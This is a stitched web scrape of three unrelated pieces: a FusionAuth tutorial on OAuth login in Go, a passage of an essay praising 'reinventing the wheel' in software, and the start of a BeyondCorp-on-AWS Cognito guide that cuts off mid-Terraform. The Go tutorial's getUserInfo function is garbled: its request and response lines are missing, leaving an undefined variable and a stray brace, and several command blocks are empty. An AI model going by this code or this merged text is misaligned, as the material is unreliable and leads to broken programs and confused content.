<p>FusionAuth lets you <a href="https://fusionauth.io/docs/v1/tech/installation-guide/">pick your installation method</a>. However, in this post, we’ll install using Homebrew. The process is simple. First, we install the tap by running the following command in the terminal:</p>

<div><div><pre><code>brew tap fusionauth/homebrew-fusionauth
</code></pre></div></div>

<p>Note that this installation step only needs to be done once. Next, we need to install the FusionAuth main service by running the following command:</p>

<div><div><pre><code>brew <span>install </span>fusionauth-app
</code></pre></div></div>

<p>Lastly, we need to start the FusionAuth service by running this in the project terminal:</p>

<div><div><pre><code>brew services start fusionauth-app
</code></pre></div></div>

<p>In order to get started, we need to open our browser and go to <code>http://localhost:9011</code>. Then, we need to complete the maintenance mode and the setup wizard.</p>

<h3 id="setup-fusionauth-with-the-installation-wizard">Setup FusionAuth with the installation wizard</h3>

<p>The maintenance mode form requires a super user credential for your database:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/golang-oauth/maintenance-mode-database.png" alt="The FusionAuth maintenance mode screen, including the super user configuration."></p>

<p>It will use these credentials to create a database user for FusionAuth to connect as. Further down the maintenance mode page, you can specify the username and password of this user if you choose:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/golang-oauth/maintenance-mode-database-lower.png" alt="Adding a user for FusionAuth to connect as."></p>

<p>If you want to create a FusionAuth user and database using different tools, rather than maintenance mode, you can. See the <a href="https://fusionauth.io/docs/v1/tech/guides/silent-mode">silent mode documentation</a> for more on this option.</p>

<p>Once you’ve created a database for FusionAuth, you’ll need to accept the license and create an initial FusionAuth account:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/golang-oauth/setup-wizard.png" alt="The FusionAuth setup wizard."></p>

<p>Then you’ll need to log in to this new FusionAuth account. This user has administrative privileges within the FusionAuth instance:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/golang-oauth/login-admin-screen.png" alt="Logging in to the FusionAuth administrative user interface."></p>

<h3 id="create-and-configure-a-new-application">Create and configure a new Application</h3>

<p>Initially, there will be only one application: FusionAuth itself. Hence, we need to create a new application by navigating to the “Applications” tab and clicking the green “+” sign.</p>

<p>Then, we need to configure this application. First, add the authorized callback of <code>http://localhost:8080/callback</code>. This is the URL which will process the authorization code should a user authenticate successfully.</p>

<p>In addition, make sure that the Authorization Code checkbox is checked. This is the grant we’ll be using, and the one that is recommended for most use cases.</p>

<p>After successful setup, view the application by clicking the green magnifying glass. The OAuth <code>Client ID</code> and <code>Client Secret</code> values can also be found on the same screen, in the “OAuth configuration” section. You’ll want to note both of those.</p>

<p><img src="https://fusionauth.io/assets/img/blogs/golang-oauth/oauth-configuration.png" alt="The application configuration screen."></p>

<p>We set up this application in the default tenant. FusionAuth supports multi-tenant configurations, but for this post, we’ll keep all user data in one tenant, as that makes things slightly simpler. Now, our FusionAuth setup is complete. Let’s move to the golang part.</p>

<h2 id="setting-up-the-development-environment-for-golang">Setting up the development environment for golang</h2>

<p>We are going to set up a development environment for golang. You can skip this if you already have it. First, we need to download Go from its <a href="https://golang.org/">official website</a>.</p>

<p>Let’s walk before we run. Here’s the simplest Go project; not surprisingly this is the typical ‘Hello World’ program. This is what it looks like:</p>

<div><div><pre><code><span>package</span> <span>main</span>
<span>import</span> <span>"fmt"</span>
<span>func</span> <span>main</span><span>()</span> <span>{</span>
  <span>fmt</span><span>.</span><span>Println</span><span>(</span><span>"Hello, Golang"</span><span>)</span>
<span>}</span>
</code></pre></div></div>

<p>Save this in a file called <code>main.go</code>. In the terminal, in the directory where this code is, run:</p>



<p>We see the following output:</p>



<p>Success! Let’s add in some authentication, shall we?</p>

<h2 id="setting-up-initial-handlers-and-oauth2-config-in-our-golang-app">Setting up initial handlers and OAuth2 config in our golang app</h2>

<p>We are going to set up the handlers and OAuth2 configuration. For that, we need to import necessary components such as the OAuth and HTTP packages first:</p>

<div><div><pre><code><span>package</span> <span>main</span>
<span>import</span> <span>(</span>
  <span>"fmt"</span>
  <span>"io/ioutil"</span>
  <span>"net/http"</span>
  <span>"golang.org/x/oauth2"</span>
  <span>"github.com/thanhpk/randstr"</span>
<span>)</span>
<span>//...</span>
</code></pre></div></div>

<p>Depending on your golang setup you may need to <code>get</code> the nonstandard packages:</p>

<div><div><pre><code>go get github.com/thanhpk/randstr
go get golang.org/x/oauth2  
</code></pre></div></div>

<p>Then, we need to define a variable to contain the configurations as shown in the code snippet below:</p>

<div><div><pre><code><span>//...</span>
<span>var</span> <span>(</span>
  <span>FusionAuthConfig</span> <span>*</span><span>oauth2</span><span>.</span><span>Config</span>
  <span>oauthStateString</span> <span>=</span> <span>randstr</span><span>.</span><span>Hex</span><span>(</span><span>16</span><span>)</span>
<span>)</span>
<span>//...</span>
</code></pre></div></div>

<p>Next, we need to create a new OAuth instance and configure it in the init function. Here, we need <code>ClientID</code> and <code>ClientSecret</code>, which we got from the FusionAuth application OAuth config section. We also need to define the OAuth2 endpoints (which we can pull from the <a href="https://fusionauth.io/docs/v1/tech/oauth/endpoints">FusionAuth docs</a>) and a callback URL (as entered in the FusionAuth config above):</p>

<div><div><pre><code><span>//...</span>
<span>func</span> <span>init</span><span>()</span> <span>{</span>
  <span>FusionAuthConfig</span> <span>=</span> <span>&amp;</span><span>oauth2</span><span>.</span><span>Config</span><span>{</span>
    <span>RedirectURL</span><span>:</span> <span>"http://localhost:8080/callback"</span><span>,</span>
    <span>ClientID</span><span>:</span>    <span>"7d2b4cb4-ccd5-42ac-8469-f802393c8f98"</span><span>,</span>
    <span>ClientSecret</span><span>:</span><span>"6x9GI_FUs5TBt_ql0m1CxNy962L7SEf0Kx2KxsY7WYw"</span><span>,</span>
    <span>Scopes</span><span>:</span>      <span>[]</span><span>string</span><span>{</span><span>"openid"</span><span>},</span>
    <span>Endpoint</span><span>:</span> <span>oauth2</span><span>.</span><span>Endpoint</span><span>{</span>
      <span>AuthURL</span><span>:</span>  <span>"http://localhost:9011/oauth2/authorize"</span><span>,</span>
      <span>TokenURL</span><span>:</span> <span>"http://localhost:9011/oauth2/token"</span><span>,</span>
      <span>AuthStyle</span><span>:</span> <span>oauth2</span><span>.</span><span>AuthStyleInHeader</span><span>,</span>
    <span>},</span>
  <span>}</span>
<span>}</span>
<span>//...</span>
</code></pre></div></div>

<p>Here, we have configured our OAuth connection inside the <code>init</code> function. This function is run every time the application is started. In a production application, these values should be pulled from a configuration file or a database table, rather than hard coded.</p>

<h2 id="adding-our-display">Adding our display</h2>

<p>Now, we need to display a page. For the <code>handleMain</code> function, we are hard coding HTML as shown below, but for a larger application you might want to look at a templating language:</p>

<div><div><pre><code><span>//...</span>
<span>func</span> <span>handleMain</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
  <span>var</span> <span>htmlIndex</span> <span>=</span> <span>`&lt;html&gt;
    &lt;body&gt;
       &lt;a href="/login"&gt;FusionAuth Log In&lt;/a&gt;
    &lt;/body&gt;
    &lt;/html&gt;`</span>
   <span>fmt</span><span>.</span><span>Fprintf</span><span>(</span><span>w</span><span>,</span> <span>htmlIndex</span><span>)</span>
<span>}</span>
<span>//...</span>
</code></pre></div></div>

<p>Then, we need to call the <code>handleMain</code> function inside the <code>main</code> function. This lets us listen to port 8080:</p>

<div><div><pre><code><span>//...</span>
<span>func</span> <span>main</span><span>()</span> <span>{</span>
  <span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/"</span><span>,</span> <span>handleMain</span><span>)</span>
  <span>fmt</span><span>.</span><span>Println</span><span>(</span><span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>))</span>
<span>}</span>
<span>//...</span>
</code></pre></div></div>

<p>Since we changed the code from the “Hello world” example, we need to restart the golang program. We need to stop the existing server. Then, restart it by using this command:</p>



<p>Navigate to <code>http://localhost:8080/</code>. We will get the following screen in the web browser:</p>

<p><img src="https://fusionauth.io/assets/img/blogs/golang-oauth/app-login.png" alt="The application login page."></p>

<p>Great, but how do we actually log in? Glad you asked.</p>

<h2 id="login-function">Login function</h2>

<p>For the login function, we need to create a new function called <code>handleFusionAuthLogin</code>. Then, we generate a URL and use the HTTP package to redirect the user to it. Because we are using a properly configured OAuth library, the URL is generated for us.</p>

<div><div><pre><code><span>//...</span>
<span>func</span> <span>handleFusionAuthLogin</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
  <span>url</span> <span>:=</span> <span>FusionAuthConfig</span><span>.</span><span>AuthCodeURL</span><span>(</span><span>oauthStateString</span><span>)</span>
  <span>http</span><span>.</span><span>Redirect</span><span>(</span><span>w</span><span>,</span> <span>r</span><span>,</span> <span>url</span><span>,</span> <span>http</span><span>.</span><span>StatusTemporaryRedirect</span><span>)</span>
<span>}</span>
<span>//...</span>
</code></pre></div></div>

<h2 id="handling-the-callback">Handling the callback</h2>

<p>In order to handle the callback, which will contain the <code>code</code> parameter and is crucial to the Authorization Code grant, we pass the <code>code</code> and <code>state</code> variables to a <code>getUserInfo</code> function. We’ll see the code behind that function below, but it is going to get user data back from FusionAuth. The code to handle the callback is:</p>

<div><div><pre><code><span>//...</span>
<span>func</span> <span>handleFusionAuthCallback</span><span>(</span><span>w</span> <span>http</span><span>.</span><span>ResponseWriter</span><span>,</span> <span>r</span> <span>*</span><span>http</span><span>.</span><span>Request</span><span>)</span> <span>{</span>
  <span>content</span><span>,</span> <span>err</span> <span>:=</span> <span>getUserInfo</span><span>(</span><span>r</span><span>.</span><span>FormValue</span><span>(</span><span>"state"</span><span>),</span> <span>r</span><span>.</span><span>FormValue</span><span>(</span><span>"code"</span><span>))</span>
  <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
    <span>fmt</span><span>.</span><span>Println</span><span>(</span><span>err</span><span>.</span><span>Error</span><span>())</span>
    <span>http</span><span>.</span><span>Redirect</span><span>(</span><span>w</span><span>,</span> <span>r</span><span>,</span> <span>"/"</span><span>,</span> <span>http</span><span>.</span><span>StatusTemporaryRedirect</span><span>)</span>
    <span>return</span>
  <span>}</span>
  <span>fmt</span><span>.</span><span>Fprintf</span><span>(</span><span>w</span><span>,</span> <span>"Content: %s</span><span>\n</span><span>"</span><span>,</span> <span>content</span><span>)</span>
<span>}</span>
<span>//...</span>
</code></pre></div></div>

<p>We’ll also need to update our main function to ensure the above two handlers are registered at a path accessible to the browser:</p>

<div><div><pre><code><span>func</span> <span>main</span><span>()</span> <span>{</span>
  <span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/"</span><span>,</span> <span>handleMain</span><span>)</span>
  <span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/login"</span><span>,</span> <span>handleFusionAuthLogin</span><span>)</span>
  <span>http</span><span>.</span><span>HandleFunc</span><span>(</span><span>"/callback"</span><span>,</span> <span>handleFusionAuthCallback</span><span>)</span>
  <span>fmt</span><span>.</span><span>Println</span><span>(</span><span>http</span><span>.</span><span>ListenAndServe</span><span>(</span><span>":8080"</span><span>,</span> <span>nil</span><span>))</span>
<span>}</span>
</code></pre></div></div>

<h2 id="display-the-user-data">Display the user data</h2>

<p>In order to fetch and display user info, we need to create the <code>getUserInfo</code> function, as promised above.</p>

<div><div><pre><code><span>//...</span>
<span>func</span> <span>getUserInfo</span><span>(</span><span>state</span> <span>string</span><span>,</span> <span>code</span> <span>string</span><span>)</span> <span>([]</span><span>byte</span><span>,</span> <span>error</span><span>)</span> <span>{</span>
  <span>if</span> <span>state</span> <span>!=</span> <span>oauthStateString</span> <span>{</span>
    <span>return</span> <span>nil</span><span>,</span> <span>fmt</span><span>.</span><span>Errorf</span><span>(</span><span>"invalid oauth state"</span><span>)</span>
  <span>}</span>
  <span>token</span><span>,</span> <span>err</span> <span>:=</span> <span>FusionAuthConfig</span><span>.</span><span>Exchange</span><span>(</span><span>oauth2</span><span>.</span><span>NoContext</span><span>,</span> <span>code</span><span>)</span>
  <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
    <span>return</span> <span>nil</span><span>,</span> <span>fmt</span><span>.</span><span>Errorf</span><span>(</span><span>"code exchange failed: %s"</span><span>,</span> <span>err</span><span>.</span><span>Error</span><span>())</span>
  <span>}</span>
  <span>url</span> <span>:=</span> <span>"http://localhost:9011/oauth2/userinfo"</span>

  <span>}</span>
  <span>return</span> <span>contents</span><span>,</span> <span>nil</span>
<span>}</span>
<span>//...</span>
</code></pre></div></div>

<p>That’s a fair bit of code, let’s break it down:</p>

<ul>
  <li>First, we check the <code>state</code> parameter received from the server matches what we sent. This is to prevent CSRF attacks.</li>
  <li>Then, we exchange the <code>code</code> parameter and retrieve an access token.</li>
  <li>Next, we construct a request to a well known user information endpoint with an <code>Authorization</code> header, using the access token as a bearer token.</li>
  <li>Last, we print the response from the server.</li>
</ul>

<p>If you run this locally, you’ll see something similar to what is in this video:</p>

<h2 id="next-steps">Next steps</h2>

<p>Obviously you’d want to do more than just print out a JSON data structure in a real application. You’d want to show the user’s data, welcome them, and/or show or hide functionality based on who they were.</p>

<p>You could also make requests to other APIs, presenting …</p></div></div>

But, I’m rather glad that when my cab arrives it won’t be using anything remotely close to those wheels.</p><p>‍</p><h2>Relationship to Programming</h2><p>I hope the deconstruction of the metaphor has helped spur an idea about how utterly baseless this idiom is when it comes to software. Some of <a href="https://github.com/torvalds/linux">the most widely used and essential</a> pieces of software ever created are <a href="https://gcc.gnu.org/">reinventions of a wheel</a>.</p><p>Linux is a reinvention of Unix, MariaDB is a reinvention of MySQL, MySQL being a reinvention of PostgreSQL/OracleDb.</p><p>Modern C++ is a reinvention of C++, which is a reinvention of C (which is a reinvention of B which is a reinvention of BCPL). Rust is a reinvention of modern C++ and C. Clojure is a reinvention of LISP. LISP is a reinvention of IPL and Lambda calculus. Haskell is a reinvention of System FC, which is a reinvention of System F, which is a reinvention of Lambda calculus. <a href="http://lampwww.epfl.ch/~amin/dot/fool.pdf">DOT</a> is a reinvention of OO, Kotlin is a reinvention of Java.</p><p>Vim is a reinvention of Vi. Wayland is a reinvention of Xorg. Systemd is a reinvention of about 500 different piece of software. Ubuntu is a reinvention of Debian. Arch is a reinvention of Gentoo and even the core of OS X is an unfortunate reinvention of BSD.</p><p>I could keep going for as much as I like…</p><p>Many advances in software are not done by adding to an existing code-base, but <a href="https://www.mindsdb.com/blog/user-question-who-is-xai-for" target="_blank">by reiterating on it and coming up with something better</a>. That’s why for every popular repository on GitHub there are hundreds of forks. For any use-case imaginable you have dozens of variations of tools to choose from.</p><p><strong>Invent your very own wheel, for your very own needs and, who knows, maybe the general public will end up considering it a better wheel.</strong></p><p>People are often discouraged from “reinventing the wheel”, despite the fact that most advances in computer science are exactly those related to reinventing the wheel, rather than creating something that is completely new.</p><p>Change is incremental, we re-iterate upon an already existing concept and slowly modify it and make it better, until you can’t even fathom how you got from the original to where you are. And the amazing thing is, it costs us nothing but time to do so, that’s the great thing about programming, there’s no resource scarcity, no matter how crazy your reinvention, you can create it.</p><p>Instead, what we should focus on, is telling people how and when to reinvent the wheel. I’ve allowed myself to put together a quick list.</p><p>‍</p><h2>Reinvent the Wheel When No Wheel Fits Your Cart</h2><p>That is to say, instead of designing an inferior software or product to cope with existing libraries, create the library or tool you need, it’s very likely someone else will need it as well.</p><p><strong>This approach can take longer, but it can be fun and it can result in a better product.</strong></p><p>Obviously you have a to be a bit flexible and pick your battles, otherwise, you end up being one of those C “programmers” who insists they must write their own lists and vectors or one of the JavaScript “developers” that takes part in the 100,000+ daily downloads of the <a href="https://www.npmjs.com/package/is-odd">is_odd</a> library.</p><p>Where you draw the line is an open question, with no single answer.</p><p>A very good example of this is <a href="https://julialang.org/">Julia</a>, a programming language which is very similar to Python in all but three aspect:</p><ul role="list"><li>It’s easy to deploy without needing virtual environments.</li><li>It’s much faster for vector operations</li><li>It’s designed with large scale parallelism in mind.</li></ul><p>It does what could “theoretically” be done with a combination of virtual environments, Cython, proper usage of C/C++ libraries, some coding guidelines and a bit of patience.</p><p>But Julia does these things out of the box and it just kind of works. It ends up saving large amounts of time and making development more enjoyable. It’s probably one of the most amazing languages of the 21st century.</p><p>‍</p><h2>Reinvent the Wheel if There Have Been No Recent Reinventions</h2><p>Another reason to reinvent the wheel is that none has tried to do so as of late. This could mean that the current wheel is very good and needs no major improvements, but it often means that there’s a lot of people who would like a better one, they just don’t have the time or will to make it.</p><p>It often happens that a problem is “fixed” in an imperfect way, then left to the wayside, since our current technology and mental frameworks can’t find a better solution.</p><p>One can often find, looking at these kind of problems a few years down the road, that technology is now up to speed and they can be solved in a much better way.</p><p>A great example of this is image recognition, which was thought of as the job for “classic” classifiers. Loads of incremental improvements were done to these classifiers and by 2010 you had pretty good results using stuff like the <a href="https://www.robots.ox.ac.uk/~vgg/rg/papers/peronnin_etal_ECCV10.pdf">fisher kernel</a>.</p><p>Still far from something you’d use to detect cancerous tumors or drive a car, something that was somewhere between a clever parrot and an elephant in terms of precision, number of labels it could train on and training time.</p><p>Up until someone had the idea to adapt the less popular wheel of convolution neural networks to use <a href="https://www.nvidia.com/content/tegra/embedded-systems/pdf/jetson_tx1_whitepaper.pdf">modern GPUs</a> and improve on some of the models for image recognition initially developed in the 90s.</p><p>Out came the famous AlexNet &amp; Co in 2012, which, in a short few years, lead the way to the amazing image recognition technology of today. Nowadays, on medium sized datasets, we can actually outperform humans.</p><p>‍</p><h2>Reinvent the Wheel if the Wheel is Proprietary</h2><p>This is the case with many great open source projects, things like Linux, GCC and git where just reinventions of already existing software.</p><p>However, they were better in certain areas and they were open source, which meant more people used them and contributed to them. Thus making them become exponentially more amazing, quickly becoming the superior choice all around.</p><p>‍</p><h2>Reinvent the Wheel if You Think it Could be Fun</h2><p>There’s nothing wrong with having a take at reinventing a perfectly good wheel either. You may fail, but you will better understand why the current design was chosen and you will probably learn a lot.</p><p>After all, many interesting problems are already solved, but solving them again can be very enjoyable. There are millions of people that took a crack at proving the Pythagorean theorem or creating a “new LISP”, most of them, arguably, just ended up reinventing a shittier or similar wheel, but there’s no harm in it as long as they enjoyed themselves.</p><p>And on the off chance that your wheel is somewhat better, you’ve just done something to help humanity by doing something you enjoy.</p><p>‍</p><h2>In Conclusion</h2><p>Go out there and reinvent the wheel. Because it could certainly do with some improvements.</p><p>Whenever someone tells you that what you are doing is useless, remind them that what you are doing is one of the fundamental processes by which our field progresses.</p><figure id="w-node-b76c364d7c07-fd15e542"><p><img src="https://assets.website-files.com/5cae0183d85bd510b93237ff/5e7d2568bdd966d285f443fe_space-shuttle-atlantis-600502_1280.jpg" alt=""></p></figure><p>Whenever you think you are taking a crack at a problem that’s been already solved by better men in better ways remember that a 31 years old nerd—with little knowledge of astrophysics or math and a few dozen millions of dollars—managed to out performed many <em>“prestigious”</em> organizations with billion dollar budgets, thousands of PHDs, and hundreds of thousands of engineers working for them <a href="http://www.spacex.com/about/capabilities" target="_blank">by inventing a rocket</a> that is much cheaper, more powerful, safer, simpler, quicker to manufacture and can land within centimeters of precision on a planet.</p><p>So maybe, you taking a crack at making a more intuitive &amp; prettier JavaScript plotting library, a faster JITC for Python, a cheaper to manufacture ALU, a better version of the e-commerce website you shop at or a more memory efficient implementation of a lookup table, isn’t that far-fetched after all.</p></div></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>Internal websites. Every company has them, and they often contain some of your company’s most important data. So you should protect them to protect that data.</p><p>This isn’t a new idea, as companies have been creating VPNs (virtual private networks) to restrict access to their internal networks for decades. But once Google became wary of this approach in 2009 after the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Operation_Aurora">Operation Aurora</a> hack attempt, they decided to shift towards a zero-trust security model, where every request is treated as though it is coming from a network that could be compromised.</p><p>This gave birth to <a target="_blank" rel="noopener noreferrer" href="https://www.beyondcorp.com/">BeyondCorp</a>, a theoretical model for protecting all of your applications without the use of a VPN.</p><p>This idea has been widely praised by security researchers, though practical guides on getting started with it on the most popular cloud platforms are still limited. This is despite the fact that <a target="_blank" rel="noopener noreferrer" href="https://research.google/pubs/pub43231/">Google’s whitepaper explaining the idea</a> was released in 2014.</p><p>We get it, BeyondCorp is complex. It asks you to look at every single request flowing through your system and to validate it’s legitimacy based on multiple data sources: where is the request coming from, who is sending it, what is the security status of that source, etc. That’s a lot to ask!</p><p>But we also believe that getting started with BeyondCorp is much easier than many may think, and that the security payoffs can come immediately.</p><p>This blog post aims to provide a practical implementation guide for using BeyondCorp security on your internal websites hosted in AWS.</p><p>At Transcend, we use BeyondCorp security to ensure our IP and our users’ data stays safe.</p><h2 id="enough-buzz-words-what-would-this-look-like-as-a-user">Enough buzz words. What would this look like as a user?</h2><p>BeyondCorp is filled with buzz words. It’s zero trust. It’s perimeter-less. It’s context-aware.
That sure is a lot of cool phrases. But what does it look like in real life? Well, let’s see what happens when I go to Transcend’s internal codelabs site, where we have set up BeyondCorp authentication with our company’s GSuite credentials:</p><div>
  <p><img src="https://images.ctfassets.net/zp9m00phuodm/4t5suIga3myM4BR0tamdNg/7c40bb6aba6f5a3e231308b12f3ca960/demo.gif" alt="A GIF of a successful implementation of BeyondCorp with AWS."></p></div><p>When I attempt to load the site, it asks me to login with my GSuite credentials. Note that this includes a hardware MFA token requirement that is easily enforceable across an entire GSuite organization (and many other identity providers).
Once I gain access to the site, I won’t need to log in to any internal systems for an hour.</p><p>To see for yourself, head on over to <a target="_blank" rel="noopener noreferrer" href="https://codelabs.dev.trancsend.com/">codelabs.dev.trancsend.com</a>. While the DNS is public, only our internal employees can gain access to our internal tutorials, and you won’t be allowed in unless you have an <code>@transcend.io</code> email address.</p><p><em>Side note: You can check out some of our publicly facing tutorials at <a target="_blank" rel="noopener noreferrer" href="https://codelabs.transcend.io/">codelabs.transcend.io</a></em></p><h2 id="how-is-this-better-than-a-vpn">How is this better than a VPN?</h2><p><strong>VPNs create “eggshell” security, where all protections happen at the perimeter</strong>. Once access is gained into a system, all the data inside that network is accessible. And with the rise of remote work, cell phones, and other mobile devices, your “secure” network of trusted devices is becoming wider all the time. </p><p>In contrast, BeyondCorp encourages consistent authentication throughout all parts of an application for all devices. It doesn’t matter what device attempts to access codelabs.dev.trancsend.com, even our CEO’s laptop will need to authenticate securely before viewing the site’s contents.</p><p><strong>VPNs are an extra attack vector</strong>.  When a pentester or hacker attempts to attack your network, one very common approach is to search for vulnerabilities in any public-facing server of yours they can find.
Oftentimes, systems like VPN access points are a primary target.
<a target="_blank" rel="noopener noreferrer" href="https://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/">Here’s a story</a> where a bug bounty hunter attacked Facebook using this approach. When he gained access to one of their internal servers, he noticed leftover files from another pentester who had used the same vulnerability to steal a small number of internal credentials.</p><p>Exploits related to CVEs (common vulnerabilities and exposures) on VPN servers are all too common, such as the time that <a target="_blank" rel="noopener noreferrer" href="https://www.zdnet.com/article/hacker-leaks-passwords-for-900-enterprise-vpn-servers/">900+ enterprise VPN servers had their passwords dumped</a>, or when a <a target="_blank" rel="noopener noreferrer" href="https://www.claroty.com/2020/07/28/vpn-security-flaws/">commonly used VPN implementation allowed for direct access to I/O devices</a>. Or the time that Lockheed Martin who (despite a solid effort to include MFA on their VPN) was <a target="_blank" rel="noopener noreferrer" href="https://www.darkreading.com/risk-management/lockheed-martin-suffers-massive-cyberattack/d/d-id/1098013">still attacked by a group who had found the random seeds used to generate tokens on their hardware MFA tokens</a>.</p><p>And if you use your company’s WiFi network as a trusted network, that network can become an attack vector as well. In 2016, the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/KRACK">KRACK vulnerability in WPA2</a> allowed attackers to find the encryption keys for all network traffic flowing through a router.</p><p>These hacks are not theoretical. They are directed and well-coordinated. When your company is successful, someone will want your data.</p><p>In contrast, BeyondCorp has no VPN. Instead of having a public-facing service that gives access to internal, hidden sites, BeyondCorp has public-facing services that request authentication information from an internal, hidden authentication server.
Because this authentication server is not exposed, it is much harder to attack.</p><p><strong>VPNs offer no guarantees over security within your network</strong></p><div><p><img src="https://images.ctfassets.net/zp9m00phuodm/7ciKFAqbRCpa2U9B0quoJJ/4957bb9dc1660cf4fc434d27e7cda6d2/NSA_Slide_Smiley.png" alt="A diagram obtained by the Washington Post that shows (with a smiley face) that traffic inside Google’s cloud did not use encryption on requests, as they saw the network perimeter as secure."></p><figcaption>Image via Washington Post.</figcaption></div><p>While your internal service #9001 may have a firewall rule saying that only server #4001 can talk to it on port 443, how does service #9001 know that the request on #4001 was not sent by an adversary who got through the VPN security? </p><p>It doesn’t in traditional architectures.</p><p>In Edward Snowden’s document dump to the Washington Post in 2013, we got to see the picture above. In it, the NSA shows (with a smiley face) that traffic inside Google’s cloud did not use encryption on requests, as they saw the network perimeter as secure.</p><p>In this case, the NSA didn’t even need to break into the perimeter. Their <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/MUSCULAR_(surveillance_program)">MUSCULAR program</a> went directly to the network infrastructure that connected Google’s (and Yahoo’s) data centers, siphoning off so much data from the fiber optic cables that the <a target="_blank" rel="noopener noreferrer" href="https://en.wikipedia.org/wiki/Pinwale">NSA’s PINWALE database was overwhelmed</a>.</p><p>This attack was painfully simple. In today’s world of cloud everything, it’s important to remember that the VPN that protects your network physically exists somewhere, and that the cables that your network traffic flows through exist physically somewhere. Attackers are smart, and will make use of all vectors at their disposal.</p><p>In contrast, BeyondCorp authenticates all requests, even those inside your private networks. Services like AWS App Mesh will <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/app-mesh/latest/userguide/proxy-authorization.html">soon require that Proxy Authorization is used for all internal requests</a>. This requirement, as well as the increased ease of using TLS everywhere on service meshes, makes it far easier to enforce encryption and security for your network traffic.</p><h2 id="where-do-we-start">Where do we start?</h2><p>AWS has a few services that make implementing BeyondCorp quite manageable. If you’re getting nervous and thinking that adding application code to every single frontend and backend in your company sounds like a lot of work, have no fear—Amazon Cognito is here!</p><p><a target="_blank" rel="noopener noreferrer" href="https://aws.amazon.com/cognito/">Amazon Cognito</a> is a managed service for authentication management. It connects with many identity providers, like Google, Facebook, and Apple, while also supporting generic providers through SAML and OpenID Connect.</p><p>If you aren’t familiar with these authentication protocols, just know that it means that in the Codelabs demo from earlier, you can change the GSuite login to be login through Okta, Amazon accounts, your company’s custom auth, etc.</p><p>Cognito is a great fit for introducing BeyondCorp because it lives at the infrastructure level, and can be easily added to individual services. This makes adding BeyondCorp incrementally easy, and also means that you don’t need to make <strong>any</strong> application code changes. If you have polyglot apps written in a variety of languages and frameworks, you’re in luck: Cognito works the same way for all of them.</p><h2 id="creating-a-cognito-user-group">Creating a Cognito User Group</h2><p>The first step of this process is to create a group of people who can access your resources. With Cognito, each different group of people that should have access to a different set of resources can be made into a <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pools-user-groups.html">User Pool</a>.</p><p>To create a User Pool with <a target="_blank" rel="noopener noreferrer" href="https://www.terraform.io/">Terraform</a>, we can write:</p><div><pre><p><span>1</span><span>resource </span><span>"aws_cognito_user_pool"</span><span> </span><span>"pool"</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>name</span><span> </span><span>=</span><span> </span><span>"codelab-user-pool"</span><span></span></p><p><span>3</span><span></span><span>}</span></p></pre></div><p>The next step is to create a <a target="_blank" rel="noopener noreferrer" href="https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-client-apps.html">User Pool App Client</a>, which is what controls the settings for how users can authenticate to the User Pool:</p><div><pre><p><span>1</span><span>locals</span><span> </span><span>{</span><span></span></p><p><span>2</span><span>  </span><span>domain</span><span>         </span><span>=</span><span> </span><span>"codelabs.dev.trancsend.com"</span><span></span></p><p><span>3</span><span>  </span><span>backend_alias</span><span>  </span><span>=</span><span> </span><span>"beyondcorp-alb.</span><span>$</span><span>{</span><span>local</span><span>.</span><span>domain</span><span>}</span><span>"</span><span></span></p><p><span>4</span><span>  </span><span>frontend_alias</span><span> </span><span>=</span><span> </span><span>"beyondcorp-cloudfront.</span><span>$</span><span>{</span><span>local</span><span>.</span><span>domain</span><span>}</span><span>"</span><span></span></p><p><span>5</span><span></span><span>}</span><span></span></p><p><span>6</span><span></span></p><p><span>7</span><span></span><span>resource </span><span>"aws_cognito_user_pool_client"</span><span> </span><span>"client"</span><span> </span><span>{</span><span></span></p><p><span>8</span><span>  </span><span>name</span><span>                </span><span>=</span><span> </span><span>"codelab-user-pool-client"</span><span></span></p><p><span>9</span><span>  </span><span>user_pool_id</span><span>        </span><span>=</span><span> aws_cognito_user_pool.pool.id</span></p><p><span>10</span><span>  </span><span>generate_secret</span><span>     </span><span>=</span><span> </span><span>true</span><span></span></p><p><span>11</span><span>  </span><span>allowed_oauth_flows</span><span> </span><span>=</span><span> </span><span>[</span><span>"code"</span><span>]</span><span></span></p><p><span>12</span><span>  </span><span>callback_urls</span><span> </span><span>=</span><span> </span><span>[</span><span></span></p><p><span>13</span><span>    </span><span>"https://</span><span>$</span><span>{</span><span>local</span><span>.</span><span>backend_alias</span><span>}</span><span>/oauth2/idpresponse"</span><span>,</span></p><p><span>14</span><span>    </span><span>"https://</span><span>$</span><span>{</span><span>local</span><span>.</span><span>frontend_alias</span><span>}</span><span>"</span><span>,</span></p><p><span>15</span><span>  </span><span>]</span><span></span></p><p><span>16</span><span>  </span><span>allowed_oauth_scopes</span><span>                 </span><span>=</span><span> </span><span>[</span><span>"email"</span><span>, </span><span>"openid"</span><span>]</span><span></span></p><p><span>17</span><span>  </span><span>allowed_oauth_flows_user_pool_client</span><span> </span><span>=</span><span> 